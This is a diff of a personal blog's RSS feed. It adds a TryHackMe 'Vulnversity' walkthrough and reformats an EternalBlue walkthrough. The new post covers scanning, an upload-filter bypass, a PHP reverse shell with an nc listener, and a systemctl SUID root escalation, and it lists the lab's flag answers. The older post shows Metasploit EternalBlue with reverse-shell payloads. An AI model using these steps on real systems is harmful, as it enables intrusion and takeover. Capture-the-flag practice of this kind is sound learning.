@@ -6,8 +6,195 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Wed, 28 Sep 2022 10:21:14 -0500</lastBuildDate>
+        <lastBuildDate>Tue, 11 Apr 2023 15:50:37 -0500</lastBuildDate>
         <atom:link href="https://jb-williams.github.io/jbtech.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>THM_Vulnversity_Walkthrough</title>
+            <link>https://jb-williams.github.io/jbtech.github.io/posts/2023/04/thm_vulnversity_walkthrough/</link>
+            <pubDate>Tue, 11 Apr 2023 15:50:37 -0500</pubDate>
+            
+            <guid>https://jb-williams.github.io/jbtech.github.io/posts/2023/04/thm_vulnversity_walkthrough/</guid>
+            <description>Vulnversity Walkthrough TryHackMe Reconnaisance They first ask for you to search for any nmap resourses(cheatsheets) online, I came across this one that seemed really useful: https://www.stationx.net/nmap-cheat-sheet/
+The First Real Question
+Scan the box, how many ports are open? I like to build up a chain of commands for most boxes.
+While doing my scans I like to create a file that contains just the numerical port values to have. So my command came out like this: nmap -v -T4 -sV -sC -oA nmap/initial 10.</description>
+            <content type="html"><![CDATA[<h1 id="vulnversity-walkthrough-tryhackme">Vulnversity Walkthrough TryHackMe</h1>
+<h2 id="reconnaisance">Reconnaisance</h2>
+<p>They first ask for you to search for any <code>nmap</code> resourses(cheatsheets) online, I came across this one that seemed really useful:
+<code>https://www.stationx.net/nmap-cheat-sheet/</code></p>
+<p><em>The First Real Question</em></p>
+<h3 id="scan-the-box-how-many-ports-are-open"><strong>Scan the box, how many ports are open?</strong></h3>
+<p>I like to build up a chain of commands for most boxes.</p>
+<ul>
+<li>While doing my scans I like to create a file that contains just the numerical port values to have. So my command came out like this:</li>
+</ul>
+<pre tabindex="0"><code>nmap -v -T4 -sV -sC -oA nmap/initial 10.10.124.14 &amp;&amp; grep -i &#34;open&#34; nmap/initial.nmap | cut -d&#39; &#39; -f 1 | cut -d&#39;/&#39; -f1 | tee nmap/ports.txt | wc -l
+</code></pre><ul>
+<li>Number of ports open: <code>6</code></li>
+</ul>
+<h1 id="heading"></h1>
+<h3 id="what-version-of-the-squid-proxy-is-running-on-the-machine"><strong>What version of the <code>squid proxy</code> is running on the machine?</strong></h3>
+<pre tabindex="0"><code>grep -i &#34;squid&#34; nmap/initial.nmap | awk &#39;{print $NF}&#39;
+</code></pre><ul>
+<li>Version of Squid Proxy: <code>3.5.12</code></li>
+</ul>
+<h1 id="heading-1"></h1>
+<h3 id="how-many-ports-will-nmap-scan-if-the-flag--p-400-is-used"><strong>How many ports will nmap scan if the flag -p-400 is used?</strong></h3>
+<ul>
+<li>Looking at man page or online resource: <code>400</code></li>
+</ul>
+<h1 id="heading-2"></h1>
+<h3 id="using-the-nmap-flag--n-what-will-it-not-resolve"><strong>Using the nmap flag -n what will it not resolve?</strong></h3>
+<ul>
+<li>Looking at man page or online resource: <code>DNS</code></li>
+</ul>
+<h1 id="heading-3"></h1>
+<h3 id="what-is-the-most-likely-operating-system-this-machine-is-running"><strong>What is the most likely operating system this machine is running?</strong></h3>
+<pre tabindex="0"><code>grep -i &#34;os&#34; nmap/initial.nmap
+</code></pre><ul>
+<li>Quickly scanning output, you can see that: <code>Ubuntu</code> is listed most.</li>
+</ul>
+<h3 id="what-port-is-the-web-server-running-on"><strong>What port is the web server running on?</strong></h3>
+<pre tabindex="0"><code>grep -i &#34;http&#34; nmap/initial.nmap
+</code></pre><ul>
+<li>Http server is on port: <code>3333</code></li>
+</ul>
+<p><em>Its important to ensure you are always doing your reconnaissance thoroughly before progressing. Knowing all open services (which can all be points of exploitation) is very important, don&rsquo;t forget that ports on a higher range might be open so always scan ports after 1000 (even if you leave scanning in the background)</em></p>
+<h1 id="heading-4"></h1>
+<h2 id="locating-directories-using-gobuster">Locating directories using GoBuster</h2>
+<p>Using <code>gobuster</code>:</p>
+<table>
+<thead>
+<tr>
+<th>GoBuster flag</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>-e</td>
+<td>Print the full URLs in your console</td>
+</tr>
+<tr>
+<td>-u</td>
+<td>The target URL</td>
+</tr>
+<tr>
+<td>-w</td>
+<td>Path to your wordlist</td>
+</tr>
+<tr>
+<td>-U and -P</td>
+<td>Username and Password for Basic Auth</td>
+</tr>
+<tr>
+<td>-p <!-- raw HTML omitted --></td>
+<td>Proxy to use for requests</td>
+</tr>
+<tr>
+<td>-c <!-- raw HTML omitted --></td>
+<td>Specify a cookie for simulating your auth</td>
+</tr>
+</tbody>
+</table>
+<h3 id="what-is-the-directory-that-has-an-upload-form-page"><strong>What is the directory that has an upload form page?</strong></h3>
+<pre tabindex="0"><code>gobuster dir -u http://10.10.124.148:3333 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o gobuster.txt -t 15
+</code></pre><p><em>I like using <code>feroxbuster</code> and it let me know more info esp. about the dir path sooner</em></p>
+<pre tabindex="0"><code>feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o ferox-initial.txt -t 15 -L 15 -s 200,302,304 -e -u http://10.10.124.148:3333/
+</code></pre><ul>
+<li>The directory that has an upload form page is: <code>/internal/</code> and <code>/internal/uploads</code>(but they don&rsquo;t ask for this one, its just important to know about later)</li>
+</ul>
+<h1 id="heading-5"></h1>
+<h2 id="compromise-the-webserver">Compromise the webserver</h2>
+<p>After finding the form to upload files:</p>
+<h3 id="what-file-type-which-youd-wnat-to-upload-to-exploit-the-server-is-blocked-try-a-couple-to-find-out"><em>What file type, which you&rsquo;d wnat to upload to exploit the server, is blocked? Try a couple to find out.</em>*</h3>
+<ul>
+<li>Fist, trying to upload a reverse shell: this was blocked <code>reverseshell.php</code></li>
+</ul>
+<h1 id="heading-6"></h1>
+<ul>
+<li>
+<p>The room walks you through using <code>burp</code> to fuzz the upload for, I wrote a python script to fuzz for me.:</p>
+</li>
+<li>
+<p>Url for the room to follow the <code>burp</code> walkthrough:</p>
+</li>
+<li>
+<p><a href="https://tryhackme.com/room/vulnversity">Vulnversity</a></p>
+</li>
+<li>
+<p>After testing different php file extensions, using curl,python,burp,zap to fuzz the upload form, you come across this one working: <code>.phtml</code></p>
+</li>
+<li>
+<p>Download this PHP revsere shell <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">downloadLink</a> - <code>php-reverse-shell.phtml</code></p>
+</li>
+</ul>
+<h1 id="heading-7"></h1>
+<ul>
+<li>Edit the file changing the IP to your <code>tun0</code> THM IP and desired port.</li>
+<li>Setup a listener on the port specified in the reverse shell
+ex:</li>
+</ul>
+<pre tabindex="0"><code>nc -lnvp 4444
+</code></pre><ul>
+<li>Upload the reverse shell on the upload form and navigate here to execute the payload <code>http://&lt;IP&gt;:3333/internal/uploads/php-reverse-shell.phtml</code></li>
+</ul>
+<h3 id="what-is-the-name-of-the-user-who-managers-the-webserver"><em>What is the name of the user who managers the webserver?</em>*</h3>
+<ul>
+<li>
+<p>Once on the machine:</p>
+</li>
+<li>
+<p>Ls the <code>/home</code> dir and see user: <code>bill</code></p>
+</li>
+<li>
+<p><em>What is the user flag?</em></p>
+</li>
+<li>
+<p>Ls <code>/home/bill</code> and see <code>user.txt</code></p>
+</li>
+</ul>
+<pre tabindex="0"><code>cat /home/bill/user.txt
+</code></pre><ul>
+<li>The contents of <code>user.txt</code>: <code>8bd7992fbe8a6ad22a63361004cfcedb</code></li>
+</ul>
+<h2 id="privilage-escalation">Privilage Escalation</h2>
+<p>Per THM:
+*In Linux, SUID (set owner userId upon execution) is a special type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).</p>
+<p>For example, the binary file to change your password has the SUID bit set on it (/usr/bin/passwd). This is because to change your password, it will need to write to the shadowers file that you do not have access to, root does, so it has root privileges to make the right changes.*</p>
+<h3 id="on-the-system-search-for-all-suid-files-what-file-stands-out"><strong>On the system search for all SUID files. What file stands out?</strong></h3>
+<ul>
+<li>I tend to use this <code>find</code> command to search for SUID&rsquo;s</li>
+</ul>
+<pre tabindex="0"><code>find / -perm -4000 2&gt;/dev/null
+</code></pre><ul>
+<li>Sort of using my own system as a reference, I saw this one looking fairly unusual: <code>/bin/systemctl</code></li>
+</ul>
+<h1 id="heading-8"></h1>
+<h3 id="become-root-and-get-the-last-flag-rootroottxt"><strong>Become root and get the last flag (/root/root.txt)</strong></h3>
+<ul>
+<li>Navigating to <a href="https://gtfobins.github.io/gtfobins/">GTFOBins</a> and search for that bin file.</li>
+<li>I took the <code>Sudo (b)</code> one and modified it</li>
+</ul>
+<pre tabindex="0"><code>TF=$(mktemp).service
+echo &#39;[Service]
+Type=oneshot
+ExecStart=/bin/sh -c &#34;chmod +s /bin/bash&#34;
+[Install]
+WantedBy=multi-user.target&#39; &gt; $TF
+/bin/systemctl link $TF
+/bin/systemctl enable --now $TF
+</code></pre><h1 id="heading-9"></h1>
+<ul>
+<li>I literally copy/pasted that chunk into my terminal and ran it.</li>
+<li>Then I ran <code>bash -p</code> to escalate to <code>root</code></li>
+<li>As root you can ls the <code>/root</code> dir: <code>ls /root</code> and see <code>root.txt</code></li>
+<li>Cat out root.txt <code>cat /root/root.txt</code></li>
+<li>The contents of root.txt: <code>a58ff8579f0a9270368d33a9966c7fd5</code></li>
+</ul>
+]]></content>
+        </item>
         
         <item>
             <title>THM_Blue_Walkthrough</title>
@@ -18,8 +205,8 @@
             <description>Eternal Blue TryHackMe Performed on TryHackMe.com
 Walkthrough by Jb Williams - @_binford - Github
 Fri 09/23/2022 10:16:54 AM
- Note: some output will be shortened denoted by &amp;ldquo;&amp;hellip;.&amp;rdquo;
- Scanning/Recon After finding the IP address, I ran my basic nmap recon:
+Note: some output will be shortened denoted by &amp;ldquo;&amp;hellip;.&amp;rdquo;
+Scanning/Recon After finding the IP address, I ran my basic nmap recon:
 nmap -v -sV -sC -oN initial 10.10.10.13 Results:
 PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) .</description>
             <content type="html"><![CDATA[<h1 id="eternal-blue-tryhackme">Eternal Blue TryHackMe</h1>
@@ -31,97 +218,97 @@ PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open
 <h1 id="heading-1"></h1>
 <h2 id="scanningrecon">Scanning/Recon</h2>
 <p>After finding the IP address, I ran my basic nmap recon:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -v -sV -sC -oN initial 10.10.10.13
-</code></pre></div><p><strong>Results</strong>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PORT      STATE SERVICE       VERSION
-135/tcp   open  msrpc         Microsoft Windows RPC
-139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
-445/tcp   open  microsoft-ds  Windows <span style="color:#ae81ff">7</span> Professional <span style="color:#ae81ff">7601</span> Service Pack <span style="color:#ae81ff">1</span> microsoft-ds
-<span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
-....
-....
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -v -sV -sC -oN initial 10.10.10.13
+</span></span></code></pre></div><p><strong>Results</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds  Windows <span style="color:#ae81ff">7</span> Professional <span style="color:#ae81ff">7601</span> Service Pack <span style="color:#ae81ff">1</span> microsoft-ds
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span>....
+</span></span></code></pre></div><ul>
 <li>Came back with these results and noticed ports <code>138</code> and <code>445</code>, which are usually SMB so I ran nmap with specific SMB scripts:</li>
 </ul>
 <h1 id="heading-2"></h1>
 <p><em>the first one could work but I don&rsquo;t think my VM could handle it so I did a little research and ran the second cmd</em></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -v --script<span style="color:#f92672">=</span>smb* -oN scripts 10.10.10.13
-
-nmap -v --script<span style="color:#f92672">=</span>smb-vuln-ms17-010 -oN smbscript 10.10.10.13
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -v --script<span style="color:#f92672">=</span>smb* -oN scripts 10.10.10.13
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>nmap -v --script<span style="color:#f92672">=</span>smb-vuln-ms17-010 -oN smbscript 10.10.10.13
+</span></span></code></pre></div><ul>
 <li>The results of the SMB scan were:</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PORT      STATE SERVICE
-135/tcp   open  msrpc
-139/tcp   open  netbios-ssn
-445/tcp   open  microsoft-ds
-3389/tcp  open  ms-wbt-server
-....
-....
-
-Host script results:
-| smb-vuln-ms17-010: 
-|   VULNERABLE:
-|   Remote Code Execution vulnerability in Microsoft SMBv1 servers <span style="color:#f92672">(</span>ms17-010<span style="color:#f92672">)</span>
-|     State: VULNERABLE
-|     IDs:  CVE:CVE-2017-0143
-|     Risk factor: HIGH
-|       A critical remote code execution vulnerability exists in Microsoft SMBv1
-|        servers <span style="color:#f92672">(</span>ms17-010<span style="color:#f92672">)</span>.
-|           
-|     Disclosure date: 2017-03-14
-|     References:
-|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-
-wannacrypt-attacks/
-|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
-|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span style="color:#f92672">=</span>CVE-2017-0143
-Host script results:
-| nbstat: NetBIOS name: JON-PC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC:-
-02:8d:e0:a6:1c:6f <span style="color:#f92672">(</span>unknown<span style="color:#f92672">)</span>
-| Names:
-|   JON-PC&lt;00&gt;           Flags: &lt;unique&gt;&lt;active&gt;
-|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
-|   JON-PC&lt;20&gt;           Flags: &lt;unique&gt;&lt;active&gt;
-|   WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
-|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
-|_  <span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>02__MSBROWSE__<span style="color:#ae81ff">\x</span>02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
-| smb-os-discovery: 
-|   OS: Windows <span style="color:#ae81ff">7</span> Professional <span style="color:#ae81ff">7601</span> Service Pack <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>Windows <span style="color:#ae81ff">7</span> Professional 6.1<span style="color:#f92672">)</span>
-|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
-|   Computer name: Jon-PC
-|   NetBIOS computer name: JON-PC<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
-|   Workgroup: WORKGROUP<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
-|_  System time: 2022-09-23T10:23:28-05:00
-| smb-security-mode: 
-|   account_used: guest
-|   authentication_level: user
-|   challenge_response: supported
-|_  message_signing: disabled <span style="color:#f92672">(</span>dangerous, but default<span style="color:#f92672">)</span>
-| smb2-security-mode: 
-|   2.02: 
-|_    Message signing enabled but not required
-| smb2-time: 
-|   date: 2022-09-23 16:23:28
-|_  start_date: 2022-09-23 16:17:45
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT      STATE SERVICE
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds
+</span></span><span style="display:flex;"><span>3389/tcp  open  ms-wbt-server
+</span></span><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb-vuln-ms17-010: 
+</span></span><span style="display:flex;"><span>|   VULNERABLE:
+</span></span><span style="display:flex;"><span>|   Remote Code Execution vulnerability in Microsoft SMBv1 servers <span style="color:#f92672">(</span>ms17-010<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|     State: VULNERABLE
+</span></span><span style="display:flex;"><span>|     IDs:  CVE:CVE-2017-0143
+</span></span><span style="display:flex;"><span>|     Risk factor: HIGH
+</span></span><span style="display:flex;"><span>|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+</span></span><span style="display:flex;"><span>|        servers <span style="color:#f92672">(</span>ms17-010<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>|           
+</span></span><span style="display:flex;"><span>|     Disclosure date: 2017-03-14
+</span></span><span style="display:flex;"><span>|     References:
+</span></span><span style="display:flex;"><span>|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-
+</span></span><span style="display:flex;"><span>wannacrypt-attacks/
+</span></span><span style="display:flex;"><span>|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+</span></span><span style="display:flex;"><span>|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span style="color:#f92672">=</span>CVE-2017-0143
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| nbstat: NetBIOS name: JON-PC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC:-
+</span></span><span style="display:flex;"><span>02:8d:e0:a6:1c:6f <span style="color:#f92672">(</span>unknown<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| Names:
+</span></span><span style="display:flex;"><span>|   JON-PC&lt;00&gt;           Flags: &lt;unique&gt;&lt;active&gt;
+</span></span><span style="display:flex;"><span>|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
+</span></span><span style="display:flex;"><span>|   JON-PC&lt;20&gt;           Flags: &lt;unique&gt;&lt;active&gt;
+</span></span><span style="display:flex;"><span>|   WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
+</span></span><span style="display:flex;"><span>|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>02__MSBROWSE__<span style="color:#ae81ff">\x</span>02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
+</span></span><span style="display:flex;"><span>| smb-os-discovery: 
+</span></span><span style="display:flex;"><span>|   OS: Windows <span style="color:#ae81ff">7</span> Professional <span style="color:#ae81ff">7601</span> Service Pack <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>Windows <span style="color:#ae81ff">7</span> Professional 6.1<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+</span></span><span style="display:flex;"><span>|   Computer name: Jon-PC
+</span></span><span style="display:flex;"><span>|   NetBIOS computer name: JON-PC<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+</span></span><span style="display:flex;"><span>|   Workgroup: WORKGROUP<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+</span></span><span style="display:flex;"><span>|_  System time: 2022-09-23T10:23:28-05:00
+</span></span><span style="display:flex;"><span>| smb-security-mode: 
+</span></span><span style="display:flex;"><span>|   account_used: guest
+</span></span><span style="display:flex;"><span>|   authentication_level: user
+</span></span><span style="display:flex;"><span>|   challenge_response: supported
+</span></span><span style="display:flex;"><span>|_  message_signing: disabled <span style="color:#f92672">(</span>dangerous, but default<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   2.02: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2022-09-23 16:23:28
+</span></span><span style="display:flex;"><span>|_  start_date: 2022-09-23 16:17:45
+</span></span></code></pre></div><ul>
 <li>Found that the vulnerability in SMB was <code>HIGH</code>, and went to Metasploit to find an expoit to attempt.</li>
 </ul>
 <h1 id="heading-3"></h1>
 <h2 id="gain-access">Gain Access</h2>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">   -  ----                                      ---------------  ----     -----  ----
-   <span style="color:#ae81ff">0</span>  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     
-MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command
-Execution
-   <span style="color:#ae81ff">1</span>  auxiliary/scanner/smb/smb_ms17_010                         normal   No      
-MS17-010 SMB RCE Detection
-   <span style="color:#ae81ff">2</span>  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes     
-MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
-   <span style="color:#ae81ff">3</span>  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes     
-MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code 
-Execution
-   <span style="color:#ae81ff">4</span>  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes     
-SMB DOUBLEPULSAR Remote Code Execution
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>   -  ----                                      ---------------  ----     -----  ----
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     
+</span></span><span style="display:flex;"><span>MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command
+</span></span><span style="display:flex;"><span>Execution
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">1</span>  auxiliary/scanner/smb/smb_ms17_010                         normal   No      
+</span></span><span style="display:flex;"><span>MS17-010 SMB RCE Detection
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">2</span>  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes     
+</span></span><span style="display:flex;"><span>MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">3</span>  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes     
+</span></span><span style="display:flex;"><span>MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code 
+</span></span><span style="display:flex;"><span>Execution
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">4</span>  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes     
+</span></span><span style="display:flex;"><span>SMB DOUBLEPULSAR Remote Code Execution
+</span></span></code></pre></div><ul>
 <li>
 <p>I noticed the scanner module and decided to verify the vulnerability with it, which it confirmed the vulnerability.</p>
 </li>
@@ -129,14 +316,14 @@ SMB DOUBLEPULSAR Remote Code Execution
 <p>Then I tried index 2 exploit.</p>
 </li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 &gt; use <span style="color:#ae81ff">2</span>
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
-msf5 exploit<span style="color:#f92672">(</span>windows/smb/ms17_010_eternalblue<span style="color:#f92672">)</span> &gt; 
-
-set payload windows/x64/shell/reverse_tcp
-
-run
-</code></pre></div><p><em>May have to press ENTER to make the CMD prompt open.</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf5 &gt; use <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>msf5 exploit<span style="color:#f92672">(</span>windows/smb/ms17_010_eternalblue<span style="color:#f92672">)</span> &gt; 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>set payload windows/x64/shell/reverse_tcp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>run
+</span></span></code></pre></div><p><em>May have to press ENTER to make the CMD prompt open.</em></p>
 <ul>
 <li>Then press <code>CTRL+z</code> to push this shell session to the background.</li>
 </ul>
@@ -150,19 +337,19 @@ run
 <p>Select the <code>shell_to_meterpreter</code> module.</p>
 </li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;^Z
-Background session 1? <span style="color:#f92672">[</span>y/N<span style="color:#f92672">]</span>  y
-msf5 exploit<span style="color:#f92672">(</span>windows/smb/ms17_010_eternalblue<span style="color:#f92672">)</span> &gt; back
-msf5 &gt; search shell_to_meterpreter
-
-Matching Modules
-<span style="color:#f92672">================</span>
-
-   <span style="color:#75715e">#  Name                                  Disclosure Date  Rank    Check  Desc.</span>
-   -  ----                                  ---------------  ----    -----  --------
-   <span style="color:#ae81ff">0</span>  post/multi/manage/shell_to_meterpreter                 normal  No     Shell to 
-Meterpreter Upgrade
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;^Z
+</span></span><span style="display:flex;"><span>Background session 1? <span style="color:#f92672">[</span>y/N<span style="color:#f92672">]</span>  y
+</span></span><span style="display:flex;"><span>msf5 exploit<span style="color:#f92672">(</span>windows/smb/ms17_010_eternalblue<span style="color:#f92672">)</span> &gt; back
+</span></span><span style="display:flex;"><span>msf5 &gt; search shell_to_meterpreter
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Matching Modules
+</span></span><span style="display:flex;"><span><span style="color:#f92672">================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#  Name                                  Disclosure Date  Rank    Check  Desc.</span>
+</span></span><span style="display:flex;"><span>   -  ----                                  ---------------  ----    -----  --------
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>  post/multi/manage/shell_to_meterpreter                 normal  No     Shell to 
+</span></span><span style="display:flex;"><span>Meterpreter Upgrade
+</span></span></code></pre></div><ul>
 <li>
 <p>List the modules options with <code>otpions</code></p>
 </li>
@@ -179,36 +366,36 @@ Meterpreter Upgrade
 <p>Verified escalation by checking my user.</p>
 </li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; shell
-Process <span style="color:#ae81ff">1704</span> created.
-Channel <span style="color:#ae81ff">1</span> created.
-Microsoft Windows <span style="color:#f92672">[</span>Version 6.1.7601<span style="color:#f92672">]</span>
-Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2009</span> Microsoft Corporation.  All rights reserved.
-
-C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;whoami
-whoami
-nt authority<span style="color:#ae81ff">\s</span>ystem
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; shell
+</span></span><span style="display:flex;"><span>Process <span style="color:#ae81ff">1704</span> created.
